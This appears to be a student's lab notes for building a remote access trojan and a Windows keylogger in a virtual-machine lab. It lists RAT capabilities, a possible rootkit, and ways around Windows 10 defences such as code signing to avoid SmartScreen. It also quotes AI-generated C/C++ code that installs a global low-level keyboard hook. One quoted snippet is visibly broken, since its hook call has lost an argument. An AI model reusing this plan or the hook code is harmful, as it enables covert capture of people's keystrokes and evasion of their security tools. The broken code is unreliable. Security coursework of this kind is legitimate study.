
Example of existing RATs: NjRAT, Blackshades.

Potential Functionalities:
- Allow file transfer between attacker(KALI VM) and the target windows VM. Both download and upload. Can be over FTP, HTTP, or TCP(prop a bit more work).
- Screen capture: Livestreaming the screen of the target, can be done with windows API such as BitBlt(), GetWindowsRect(),...
- Keyboard and mouse control: Attacker can send keystrokes and control mouse cursor on target system remote. 
- Anti-detection features:  rootkit? 
- Network proxy: Attacker can route traffic through infected target and hide their IP.

Networking in the Oracle Lab: KALI, Lab and Target need to talk to each other. 
- Can do **Bridget networking**: VMs unique IPs and allows them to communicate directly with the host computer network interface. 
- Can do **NAT networking**: Private IP addresses to the VMs and routes traffic through a shared virtual network adapter on the host machine.  
- May need to modify firewall settings on each VM to allow desired communication. 

General: 
- Think about what can happen if something spread to the Host computer.
- Time sync. between the VMs can use useful to prevent bugs. Use ntpdate(KALI) og w32tm / resync (Windows).
- Use snapshots of VMs when deploying malware.
- Problems with executing such program in Windows 10? Does defender block such execution? 


#### Keylogger: 

Save all keystrokes made on a system and save them in a nicely formatted matter in a .txt file with date. It is designed to work in Windows, and by nature is not cross platform. When we have managed to save normal keystrokes, we need to encrypt the content of the .txt file containing the key logs. 

C++ vs PowerShell: C++ preforms better, and has better control over system resources. But PowerShell is a bit "simpler" to develop. Since I have more experience with C++, I clearly preferer to use it over PS:   

**Research:**
- Different ways we can capture keyboard input on windows. 
- Event handling: Register and handle global keyboard events using Windows API, may need to use low-level keyboard hooks (?), SetWindowsHookEx() or RegisterRawInputDevices(). 
- Data structure for saving keystrokes to file:  Asynchronous I/O operation WriteFile()? Better to write to file in large chunks, helps reduce number of times I/O functions is called. 
- Error handling: What to do if the program faile to read a keystroke? What happens when the user turns of the system? -> If program cannot record the keystroke, have expiation handling. 
- Getting around security features in Windows 10: Sign the executable with valid code-signing certification to prove it is legit. Can help bypass SmartScreen Warnings when user try to run it. Other: Can use packaging tool, more? 
![[Pasted image 20240530164344.png]]
- Hookchains: The callback function in SetWindowsHookEx() returns a call to CallNextHookEx(). Not sure how this works, or why we care. -> functionality gets broken? Basically, since we are intercepting the keystrokes as raw data before any other part of the system, not calling the next hook, may result in other parts of the system to not get access to the keyinput. Returning CallNextHookEx() ensures normal functionality. 


Global keyboard events: We need to capture all keystrokes that happen on the computer, even if the target user is not interacting with any specific program or interface. To be able to do this, we need  **Hooks**.

Hooks: lets us intercept raw keyboard input data before it is processed by the operating system or any other application. Ensures that we are capturing ALL keyboard events 

**From ollama-dolphin:**

Here's an example of how you can use the `SetWindowsHookEx()` function to install a low-level
keyboard hook in C++:

```cpp
HHOOK hhk = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKCB)KeyboardHookCallback, NULL, 0);
if (hhk == NULL) {
    // Handle error
}
```

In this example, `KeyboardHookCallback()` is the name of the hook proc callback function that processes the captured keyboard events. You need to define this function in your code and handle the appropriate keyboard event messages (e.g., `WM_KEYDOWN`, `WM_KEYUP`) by using the `lParam` parameter of the `KeyboardHookCallback()` function, which contains information about the
captured keystrokes.

Remember that you also need to uninstall your hook by calling the `UnhookWindowsHookEx()`
function when your keylogger is no longer running or needs to be removed from the system:

```cpp
if (hhk != NULL) {
    UnhookWindowsHookEx(hhk);
}
```



Function breakdown:
```c
HHOOK SetWindowsHookEx(
  int       idHook,
  HOOKPROC  lpfn,
  HINSTANCE hMod,
  DWORD     dwThreadId
);
```

The function return a variable of type HHOOK, which is a **Handle** to the hook procedure. 

When the hook is installed on the system, and if it is configured to listens to keyboard strokes, then the callback function "lpfn" is called each time a key is pressed. 


- idHook: Specifies the type of hook to be installed.
- lpfn: **Long pointer to a function** ,  a callback function that will be called when the specified events occur. Parameter that expects a pointer to a hook procedure. This function is user defined, but must adhere to specific signatures defined by the type of hook being set. The return type of this function depend on the idHook parameter. 
- hMod: Handel to the DLL containing the hook procedure pointed to by "lpfn".
- dwThreadId: Identifier of the thread with which the hook procedure is to be associated. If parameter is: 0; then the hook procedure is associated with all existing threads.

Draft from Gpt-4o:
```c
#include <windows.h>

HHOOK hHook = NULL;

// Hook procedure for keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) { // nCode >= 0 means a key event is being processed
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = kbdStruct->vkCode;
            // Handle the key press (e.g., log it, modify it, etc.)
            // For demonstration, let's just output the key code
            printf("Key Pressed: %d\n", vkCode);
        }
    }
    // Call the next hook in the chain
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    // Install the hook
    hHook = SetWindowsHookEx(
, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        printf("Failed to install hook!\n");
        return 1;
    }

    // Keep the application running to listen for events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the hook when done
    UnhookWindowsHookEx(hHook);

    return 0;
}
```
